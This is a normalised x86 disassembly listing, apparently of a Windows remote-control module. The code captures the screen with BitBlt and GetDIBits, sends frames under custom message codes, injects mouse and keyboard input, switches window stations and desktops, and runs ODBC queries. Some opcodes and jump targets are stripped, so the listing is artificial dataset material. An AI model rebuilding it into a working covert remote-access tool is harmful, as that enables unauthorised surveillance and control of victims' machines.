imul edx [ esi + 0x34 ]
lea eax [ edi + edx * 2 ]
lea edi [ eax + eax + 0x9 ]
push edi
call ??2@YAPAXI@Z
add edi 0x20
mov [ esi + 0x50 ] eax
push edi
call ??2@YAPAXI@Z
mov ecx [ esi + 0x30 ]
add esp 0xc
test ecx ecx
mov [ esi + 0x58 ] eax
je r-xdata
mov ecx [ esi + 0x38 ]
xor eax eax
imul ecx [ esi + 0x34 ]
shl ecx 0x2
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
cmp eax 0x18
je r-xdata
mov ecx esi
call sub_10007d60
lea eax [ esp + 0x18 ]
mov ecx ebx
push eax
mov [ esp + 0x1c ] 0xab02
call sub_10002190
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x18
retn 0x8
mov ecx [ esi + 0x28 ]
test ecx ecx
je r-xdata
mov [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x2c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x44 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x48 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x50 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov cx [ esi + 0x34 ]
mov dx [ esi + 0x38 ]
lea edi [ esi + 0x3c ]
mov [ esp + 0xc ] 0xab01
push edi
mov [ esp + 0x14 ] cx
mov [ esp + 0x16 ] dx
call [ GetCursorPos@IAT ]
mov cx [ esi + 0x40 ]
mov ax [ edi ]
lea edx [ esp + 0xc ]
mov [ esp + 0x16 ] cx
push edx
mov ecx ebx
mov [ esp + 0x18 ] ax
call sub_10002190
push esi
push 0x0
push sub_100085d0
call [ _beginthread@IAT ]
add esp 0xc
mov [ esi + 0x20 ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x8
sub_10008000
push ebx
mov ebx ecx
push ebp
push esi
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x2c ]
mov esi [ SelectObject@IAT ]
push edi
push eax
push ecx
call esi
mov edx [ ebx + 0x28 ]
mov ecx [ ebx + 0x34 ]
xor ebp ebp
push 0xcc0020
mov edi eax
mov eax [ ebx + 0x38 ]
push ebp
push ebp
push edx
mov edx [ ebx + 0x2c ]
push eax
push ecx
push ebp
push ebp
push edx
call [ BitBlt@IAT ]
mov eax [ ebx + 0x2c ]
push edi
push eax
call esi
mov ecx [ ebx + 0x24 ]
mov [ ecx ] 0x28
mov edx [ ebx + 0x24 ]
mov eax [ ebx + 0x34 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebx + 0x24 ]
mov edx [ ebx + 0x38 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebx + 0x24 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebx + 0x24 ]
mov dx [ ebx + 0x4 ]
mov [ ecx + 0xe ] dx
mov eax [ ebx + 0x24 ]
mov [ eax + 0x10 ] ebp
mov ecx [ ebx + 0x24 ]
mov [ ecx + 0x14 ] ebp
mov edx [ ebx + 0x24 ]
mov [ edx + 0x18 ] ebp
mov eax [ ebx + 0x24 ]
mov [ eax + 0x1c ] ebp
mov ecx [ ebx + 0x24 ]
mov [ ecx + 0x20 ] ebp
mov edx [ ebx + 0x24 ]
mov [ edx + 0x24 ] ebp
mov eax [ ebx + 0x4 ]
cmp eax 0x4
jne r-xdata
cdq
and edx 0x7
mov esi [ ebx + 0x44 ]
add eax edx
mov edi [ ebx + 0x48 ]
mov ecx eax
sar ecx 0x3
imul ecx [ ebx + 0x38 ]
imul ecx [ ebx + 0x34 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax [ ebx + 0x38 ]
mov esi [ ebx + 0x44 ]
cdq
sub eax edx
mov edi [ ebx + 0x48 ]
mov ecx eax
mov eax [ ebx + 0x34 ]
cdq
sub eax edx
sar ecx 0x1
sar eax 0x1
imul ecx eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
and ecx 0x3
push ebp
[ edi ] [ esi ]
mov eax [ ebx + 0x24 ]
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x38 ]
push eax
mov eax [ ebx + 0x30 ]
push ecx
mov ecx [ ebx + 0x2c ]
push edx
push ebp
push eax
push ecx
call [ GetDIBits@IAT ]
mov edx [ ebx + 0x8 ]
push edx
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10008120
sub esp 0x1c
push ebx
mov ebx ecx
mov eax 0x66666667
push ebp
mov ecx [ ebx + 0x34 ]
xor ebp ebp
imul ecx
sar edx 0x4
mov eax edx
push esi
shr eax 0x1f
add edx eax
mov eax ecx
mov [ esp + 0xc ] edx
mov ecx 0x28
cdq
idiv ecx
push edi
cmp edx ebp
mov [ esp + 0x24 ] edx
je r-xdata
mov ecx [ ebx + 0x38 ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov eax ecx
mov edi edx
mov ecx 0x28
cdq
idiv ecx
mov [ esp + 0x20 ] edi
cmp edx ebp
mov [ esp + 0x28 ] edx
je r-xdata
inc [ esp + 0x10 ]
xor ecx ecx
cmp edi ebp
mov [ esp + 0x14 ] ebp
mov [ esp + 0x18 ] ecx
mov [ ebx + 0x54 ] 0x9
jle r-xdata
inc edi
mov [ esp + 0x20 ] edi
mov eax [ ebx + 0x4c ]
lea esi [ ecx + ecx + 0x2 ]
mov [ eax + ecx * 2 ] 0xffff
mov edx [ ebx + 0x54 ]
xor eax eax
add edx esi
test ecx ecx
jle r-xdata
test edx edx
mov [ esp + 0x1c ] 0x28
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov ecx [ ebx + 0x50 ]
push 0x8
push edx
mov [ ecx ] edx
mov eax [ ebx + 0x50 ]
mov ecx [ ebx + 0x54 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x50 ]
mov cl [ ebx + 0x14 ]
mov [ eax + 0x8 ] cl
mov edi [ ebx + 0x54 ]
mov eax [ ebx + 0x50 ]
mov ecx esi
mov esi [ ebx + 0x4c ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x58 ]
mov [ esp + 0x28 ] edx
lea edx [ esp + 0x28 ]
push ecx
add eax 0x1c
push edx
push eax
call sub_10009d40
mov eax [ esp + 0x34 ]
add esp 0x14
mov eax [ esp + 0x10 ]
xor esi esi
test eax eax
jle r-xdata
lea eax [ edi - 0x1 ]
cmp ebp eax
jne r-xdata
inc ebp
cmp ebp edi
jl r-xdata
mov eax [ esp + 0x24 ]
mov edi 0x28
test eax eax
je r-xdata
mov [ esp + 0x1c ] edx
mov eax ebp
imul eax [ ebx + 0x34 ]
add eax esi
lea ecx [ eax + eax * 4 ]
mov eax [ ebx + 0x14 ]
shl ecx 0x3
cmp eax 0x4
jne r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
cmp esi ecx
jne r-xdata
cdq
and edx 0x7
add eax edx
sar eax 0x3
imul eax ecx
mov eax ecx
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
mov edi eax
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
inc edx
inc esi
cmp esi eax
mov [ esp + 0x14 ] edx
jl r-xdata
mov ecx [ ebx + 0x4c ]
mov eax [ esp + 0x18 ]
mov dx [ esp + 0x14 ]
mov [ ecx + eax * 2 ] dx
inc eax
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x1c ]
mov ecx ebx
push edx
push edi
push eax
call sub_100082d0
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
sub_100082d0
sub esp 0x10
mov eax [ esp + 0x14 ]
push ebx
mov ebx ecx
push ebp
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x48 ]
mov ebp [ ebx + 0x14 ]
xor edi edi
lea esi [ ecx + eax ]
cmp ebp 0x4
mov [ esp + 0x10 ] esi
lea ecx [ edx + eax ]
jne r-xdata
mov eax ebp
cdq
and edx 0x7
add eax edx
sar eax 0x3
imul eax [ ebx + 0x34 ]
mov eax [ ebx + 0x34 ]
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0xc
mov edi ecx
sub edi esi
mov [ esp + 0x1c ] edi
jmp r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x2c ]
test eax eax
mov [ esp + 0x18 ] 0x0
jle r-xdata
cmp ebp 0x4
jne r-xdata
mov eax ebp
imul eax [ esp + 0x28 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov eax [ esp + 0x28 ]
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push edx
push eax
push ecx
mov ecx ebx
call sub_100083c0
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn 0xc
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
add esi ecx
mov ecx [ esp + 0x2c ]
inc eax
cmp eax ecx
mov [ esp + 0x10 ] esi
mov [ esp + 0x18 ] eax
jl r-xdata
mov ecx eax
add edi esi
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn 0xc
sub_100083c0
mov edx [ esp + 0x4 ]
push ebx
mov ebx ecx
push ebp
push esi
mov esi [ ebx + 0x44 ]
mov eax [ ebx + 0x14 ]
add esi edx
cmp eax 0x4
mov [ esp + 0x10 ] esi
jne r-xdata
cdq
and edx 0x7
add eax edx
mov ebp eax
sar ebp 0x3
imul ebp [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
cdq
sub eax edx
mov ebp eax
sar ebp 0x1
jmp r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
push edi
mov [ esp + 0x18 ] eax
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jle r-xdata
mov edi [ ebx + 0x50 ]
mov eax [ ebx + 0x54 ]
mov ecx ebp
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebx + 0x54 ]
mov eax [ ebx + 0x14 ]
add edx ebp
cmp eax 0x4
mov [ ebx + 0x54 ] edx
jne r-xdata
cdq
and edx 0x7
add eax edx
sar eax 0x3
imul eax [ ebx + 0x34 ]
mov eax [ ebx + 0x34 ]
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
mov esi [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
mov ecx [ esp + 0x14 ]
add ecx eax
mov eax [ esp + 0x18 ]
dec eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
sub_10008470
sub esp 0x1c
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
call sub_10001990
test eax eax
jne r-xdata
pop esi
add esp 0x1c
retn
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x10 ]
push 0xc
mov [ esp + 0x18 ] eax
push ecx
mov ecx [ esi + 0x10 ]
mov [ esp + 0x20 ] eax
call sub_10001870
test eax eax
jl r-xdata
cmp eax 0xc
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edx - 0xab02 ]
cmp eax 0x6
ja r-xdata
mov ecx esi
mov [ esi + 0x1c ] 0x1
call sub_100089b0
jmp [ eax * 4 + jump_table_100085a8 ]
mov eax [ esp + 0x1a ]
mov ecx [ esp + 0x18 ]
and eax 0xffff
and ecx 0xffff
push eax
mov eax [ esp + 0x18 ]
push ecx
push eax
and eax 0xffff
mov ecx esi
push eax
call sub_10008850
pop esi
add esp 0x1c
retn
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x16 ]
and eax 0xffff
push edx
push eax
mov ecx esi
call sub_10008940
pop esi
add esp 0x1c
retn
mov ecx esi
mov [ esi + 0x1c ] 0x1
call sub_100089b0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x4 ] 0xab02
push ecx
mov ecx [ esi + 0x10 ]
call sub_10002190
pop esi
add esp 0x1c
retn
mov eax [ esp + 0x14 ]
cmp eax 0x4
je r-xdata
cmp eax [ esi + 0x14 ]
je r-xdata
cmp eax 0x8
je r-xdata
mov edx [ esi + 0x8 ]
push ebx
push edi
mov edi [ ResetEvent@IAT ]
push edx
mov [ esi + 0x4 ] eax
call edi
mov eax [ esi + 0x8 ]
mov ebx [ WaitForSingleObject@IAT ]
push 0x32
push eax
call ebx
mov ecx [ esi + 0x8 ]
push ecx
call edi
mov edx [ esi + 0x8 ]
push 0x32
push edx
call ebx
pop edi
mov [ esi + 0x18 ] 0x1
pop ebx
pop esi
add esp 0x1c
retn
cmp eax 0x10
je r-xdata
cmp eax 0x18
jne r-xdata
sub_100085d0
push ecx
push ebx
push ebp
push edi
call [ GetProcessWindowStation@IAT ]
mov edi eax
test edi edi
mov [ esp + 0xc ] edi
je r-xdata
pop edi
pop ebp
pop ebx
pop ecx
retn
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
push 0x2000000
push 0x0
push rw-data
call [ OpenWindowStationA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push ebx
call [ SetProcessWindowStation@IAT ]
test eax eax
je r-xdata
push ebx
call [ CloseWindowStation@IAT ]
push esi
push 0x2000000
push 0x0
push 0x0
push rw-data
call [ OpenDesktopA@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ SetProcessWindowStation@IAT ]
pop esi
mov edi [ SetThreadDesktop@IAT ]
push esi
call edi
test eax eax
je r-xdata
push esi
call [ CloseDesktop@IAT ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
call sub_10008680
push ebp
call edi
sub_10008680
sub esp 0x14
push ebp
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x10 ]
mov [ esi + 0x18 ] 0x1
call sub_10001990
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
add esp 0x14
retn
mov ebp [ GetCursorPos@IAT ]
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
push ecx
call [ ResetEvent@IAT ]
mov ecx esi
call sub_10008000
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
call ebp
mov dx [ esp + 0xc ]
mov ax [ esp + 0x10 ]
mov ecx esi
mov [ esp + 0x1c ] dx
mov [ esp + 0x1e ] ax
call sub_10008120
test eax eax
jle r-xdata
cmp [ esi + 0x4 ] 0x10
jge r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esi + 0x3c ]
cmp ecx eax
jne r-xdata
mov ecx [ esi + 0x58 ]
mov [ ecx ] 0xa014
mov [ ecx + 0x10 ] 0xab05
mov dx [ esp + 0xc ]
mov [ ecx + 0x18 ] dx
mov dx [ esp + 0x10 ]
mov [ ecx + 0x14 ] eax
add eax 0x1c
mov [ ecx + 0x1a ] dx
mov ecx [ esi + 0x10 ]
push eax
mov eax [ esi + 0x58 ]
push eax
call sub_100017f0
test eax eax
je r-xdata
mov ecx [ esi + 0x38 ]
mov edi [ esi + 0x44 ]
imul ecx [ esi + 0x34 ]
shl ecx 0x2
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx esi
call sub_10008000
mov eax [ esi + 0x4 ]
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x14 ] eax
mov ecx esi
call sub_100087e0
test eax eax
jl r-xdata
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0xab03
call sub_10002190
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x40 ]
cmp edx eax
je r-xdata
jmp r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov [ esi + 0x3c ] ecx
mov [ esi + 0x40 ] edx
mov eax [ esi + 0xc ]
push 0x1f4
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x10 ]
call sub_10001990
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
sub_100087e0
sub esp 0x420
push esi
mov esi ecx
push 0x8
push 0x400
mov eax [ esi + 0x24 ]
lea ecx [ esp + 0xc ]
add eax 0x28
lea edx [ esp + 0x2c ]
push eax
push ecx
push edx
mov [ esp + 0x18 ] 0x400
call sub_10009d40
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0x10 ]
add esp 0x14
mov [ esp + 0x1c ] eax
add eax 0x1c
mov [ esp + 0x8 ] 0xa014
push eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x20 ] 0xab07
call sub_100017f0
pop esi
add esp 0x420
retn
sub_10008850
sub esp 0x1c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
xor ebx ebx
lea eax [ edi - 0x200 ]
cmp eax 0xa
ja r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
jmp [ eax * 4 + jump_table_10008908 ]
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x10
jmp r-xdata
mov ebx [ esp + 0x34 ]
mov esi 0x800
and ebx 0xffff
mov ebp [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
push ebp
push eax
call [ SetCursorPos@IAT ]
cmp edi 0x200
je r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx 0x6
xor eax eax
lea edi [ esp + 0x14 ]
push 0x1c
[ edi ]
mov ecx [ esp + 0x3c ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
or esi 0x8000
push eax
push 0x1
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] esi
call edx
sub_10008940
mov edx [ rw-data ]
sub esp 0x1c
test edx edx
je r-xdata
add esp 0x1c
retn 0x8
push edi
mov ecx 0x6
xor eax eax
lea edi [ esp + 0x8 ]
[ edi ]
mov ax [ esp + 0x28 ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x8 ] ax
mov eax [ esp + 0x24 ]
cmp eax 0x101
pop edi
je r-xdata
mov [ esp + 0x8 ] 0x2
cmp eax 0x105
mov [ esp + 0x8 ] 0x0
jne r-xdata
lea ecx [ esp ]
push 0x1c
push ecx
push 0x1
call edx
sub_10008a30
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call Ordinal_ODBC32_9
mov eax [ esi + 0x18 ]
push eax
push 0x2
call Ordinal_ODBC32_31
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
push 0x1
call Ordinal_ODBC32_31
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop esi
retn
push eax
call [ rw-data ]
mov ecx [ esi + 0xc ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
sub_10008a90
mov eax [ esp + 0x18 ]
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
mov ebx ecx
mov [ eax ] 0x0
push 0x3c8
mov [ ebp ] 0x0
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebx + 0xc ] eax
push eax
call [ rw-data ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push 0x30000
push 0x0
push ecx
mov ecx [ esp + 0x20 ]
push 0x0
push edx
mov edx [ ebx + 0xc ]
push eax
push ecx
push edx
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
mov ecx [ ebx + 0xc ]
push ecx
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
push eax
call [ rw-data ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0xc ] esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x18
push eax
push rw-data
push ebp
call [ sprintf@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov edx [ esp + 0x28 ]
not ecx
dec ecx
mov [ edx ] ecx
mov eax [ ebx + 0xc ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn 0x18
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
mov edx [ esp + 0x28 ]
not ecx
dec ecx
mov [ edx ] ecx
sub_10008b90
sub esp 0x618
push ebx
push ebp
push esi
push edi
mov ebx ecx
push 0x100000
call ??2@YAPAXI@Z
xor esi esi
add esp 0x4
cmp eax esi
mov [ ebx + 0x8 ] eax
jne r-xdata
cmp [ esp + 0x634 ] esi
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x618
retn 0x20
mov ecx [ esp + 0x648 ]
mov eax [ esp + 0x638 ]
cmp eax esi
mov [ ecx ] esi
je r-xdata
mov ecx ebx
call sub_100097e0
test eax eax
jne r-xdata
mov ecx [ esp + 0x630 ]
mov edx [ esp + 0x62c ]
push ecx
push edx
push rw-data
lea eax [ esp + 0x234 ]
push 0x200
push eax
call [ _snprintf@IAT ]
add esp 0x14
mov edx [ esp + 0x640 ]
mov eax [ esp + 0x63c ]
mov ecx [ esp + 0x630 ]
push edx
mov edx [ esp + 0x630 ]
push eax
push ecx
push edx
push rw-data
lea eax [ esp + 0x23c ]
push 0x200
push eax
call [ _snprintf@IAT ]
add esp 0x1c
jmp r-xdata
mov ecx [ esp + 0x648 ]
mov edx [ esp + 0x644 ]
mov eax [ esp + 0x640 ]
push ecx
mov ecx [ esp + 0x640 ]
push edx
mov edx [ esp + 0x638 ]
push eax
mov eax [ esp + 0x638 ]
push ecx
push edx
push eax
mov ecx ebx
call sub_10008a90
pop edi
pop esi
pop ebp
pop ebx
add esp 0x618
retn 0x20
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x644 ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x648 ]
pop edi
not ecx
dec ecx
pop esi
mov [ eax ] ecx
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x618
retn 0x20
mov ecx [ ebp ]
push esi
push 0x3
push 0xc8
push ecx
call Ordinal_ODBC32_75
cmp ax 0xffff
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x618
retn 0x20
lea ebp [ ebx + 0x14 ]
push ebp
push esi
push 0x1
call Ordinal_ODBC32_24
cmp ax 0xffff
jne r-xdata
mov eax [ ebp ]
add ebx 0x18
push ebx
push eax
push 0x2
call Ordinal_ODBC32_24
cmp ax 0xffff
jne r-xdata
mov edx [ ebp ]
push edx
push 0x1
call Ordinal_ODBC32_31
mov [ ebp ] esi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x618
retn 0x20
lea edi [ esp + 0x228 ]
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
mov eax [ ebx ]
push esi
not ecx
push 0xff
dec ecx
push esi
lea edx [ esp + 0x238 ]
push ecx
push edx
push esi
push eax
call Ordinal_ODBC32_41
cmp ax 0xffff
jne r-xdata
mov ecx [ ebp ]
push ecx
push 0x1
call Ordinal_ODBC32_31
mov [ ebp ] esi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x618
retn 0x20
mov ebp [ esp + 0x644 ]
mov [ esp + 0x10 ] 0x1
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x28 ]
push ecx
push 0x200
lea eax [ esp + 0x24 ]
push edx
mov edx [ ebx ]
lea ecx [ esp + 0x2c ]
push eax
push ecx
push 0x1
push edx
push 0x2
mov [ esp + 0x3c ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x48 ] 0x0
call Ordinal_ODBC32_36
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x648 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x644 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ edx ] ecx
mov eax [ ebx ]
push eax
push 0x2
call Ordinal_ODBC32_31
mov ecx [ ebp ]
push ecx
push 0x1
call Ordinal_ODBC32_31
pop edi
mov [ ebp ] 0x0
pop esi
mov [ ebx ] 0x0
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x618
retn 0x20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x618
retn 0x20
lea edi [ esp + 0x428 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x428 ]
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x648 ]
not ecx
mov esi [ eax ]
dec ecx
lea edx [ ecx + 0x1 ]
lea ebp [ ecx + ebp + 0x1 ]
add esi edx
mov [ eax ] esi
mov eax [ esp + 0x10 ]
inc eax
xor esi esi
mov [ esp + 0x10 ] eax
jmp r-xdata
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x428 ]
push edx
push 0x200
lea ecx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x2c ]
push ecx
mov ecx [ ebx ]
push edx
push eax
push ecx
push 0x2
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] esi
mov [ esp + 0x448 ] 0x0
call Ordinal_ODBC32_36
test ax ax
jne r-xdata
sub_10008f00
sub esp 0x284
push ebx
mov ebx ecx
push esi
lea eax [ esp + 0x8 ]
mov ecx [ ebx + 0x18 ]
push edi
push eax
xor esi esi
push ecx
push 0x3
mov [ esp + 0x2c ] ebx
mov [ esp + 0x18 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
call Ordinal_ODBC32_24
cmp ax 0xffff
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x284
retn 0x4
cmp ax 0xfffe
je r-xdata
mov edx [ esp + 0x294 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
mov edx [ esp + 0x14 ]
push edx
call Ordinal_ODBC32_11
cmp ax 0xffff
jne r-xdata
push ebp
jmp r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x90 ]
push eax
push 0x200
lea edx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4c ]
push edx
push eax
push 0x1
push ecx
push 0x3
mov [ esp + 0xb0 ] 0x0
call Ordinal_ODBC32_36
lea edx [ esp + 0x90 ]
mov ecx ebx
push edx
call sub_100097a0
mov eax [ esp + 0xc ]
push eax
push 0x3
call Ordinal_ODBC32_31
mov edi 0x1
mov [ esp + 0x38 ] edi
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x40 ] edi
mov [ esp + 0x1c ] esi
call Ordinal_ODBC32_18
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x4c ]
push eax
push ecx
mov [ esp + 0x54 ] esi
call Ordinal_ODBC32_20
mov eax [ esp + 0x14 ]
mov [ esp + 0x20 ] esi
cmp ax si
jle r-xdata
lea eax [ esp + 0x94 ]
mov ecx ebx
push eax
call sub_100097a0
inc edi
jmp r-xdata
mov ebp [ ebx + 0x8 ]
mov ebx 0x1
movsx ecx ax
mov [ ebp ] ecx
add ebp 0x4
cmp [ esp + 0x14 ] bx
mov [ esp + 0x28 ] ebx
jl r-xdata
movsx edx ax
lea eax [ edx * 4 + 0x4 ]
push eax
call ??2@YAPAXI@Z
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x18 ]
add esp 0x4
xor ecx ecx
cmp ax si
jl r-xdata
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x94 ]
push ecx
push 0x200
lea eax [ esp + 0x20 ]
push edx
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
push edi
push edx
push 0x3
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] esi
mov [ esp + 0xb4 ] 0x0
call Ordinal_ODBC32_36
test ax ax
jne r-xdata
cmp [ esp + 0x14 ] si
jle r-xdata
jmp r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
